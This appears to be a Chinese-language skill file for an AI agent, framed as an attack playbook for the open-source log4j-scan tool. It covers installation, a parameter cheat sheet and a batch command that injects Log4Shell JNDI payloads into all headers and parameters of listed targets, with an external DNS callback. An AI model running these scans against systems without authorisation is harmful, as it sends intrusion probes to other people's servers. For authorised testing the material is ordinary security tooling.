---
name: log4j-scan-cve
description: 渗透工具 skill:log4j-scan 的安装、参数速查与攻击场景 playbook。当任务涉及 CVE专项利用 需要调用 log4j-scan 时使用。
when-to-use: 渗透工具 skill:log4j-scan 的安装、参数速查与攻击场景 playbook。当任务涉及 CVE专项利用 需要调用 log4j-scan 时使用。
---

# log4j-scan

- 攻击大类:C06 CVE专项利用
- 上游仓库:https://github.com/fullhunt/log4j-scan
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/fullhunt/log4j-scan && cd log4j-scan && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python log4j-scan.py -u https://t.com` | Log4Shell CVE-2021-44228 扫描 |
| `-l urls.txt` | 批量 |
| `--run-all-tests` | 全 header/参数测试 |
| `--custom-dns-callback vps.t.com` | 自建 DNS 接收 |
| `-w 20` | 超时 |

## 攻击场景 Playbook

### Log4Shell 批量验证

```bash
python log4j-scan.py -l targets.txt --custom-dns-callback x.dnslog.cn
# 全部 HTTP 头+常见参数注入 JNDI payload
```

## 注意事项

FullHunt 出品,Log4Shell 全量检测(全 header/全参数/多协议),支持自建 OOB。
